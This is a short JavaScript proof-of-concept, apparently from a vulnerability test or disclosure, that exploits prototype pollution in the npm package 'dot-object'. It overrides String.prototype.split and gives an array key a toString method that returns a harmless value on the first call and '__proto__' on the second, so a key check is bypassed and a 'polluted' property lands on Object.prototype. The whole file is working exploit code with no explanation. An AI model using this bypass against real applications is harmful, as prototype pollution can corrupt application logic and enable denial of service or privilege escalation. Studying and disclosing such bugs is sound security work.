var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
var a = require('dot-object');
var obj = {};
var path = '__proto__';
console.log({}.polluted);
var val = { polluted: 'yes' };
a.set(path, val, {}, true);
console.log({}.polluted);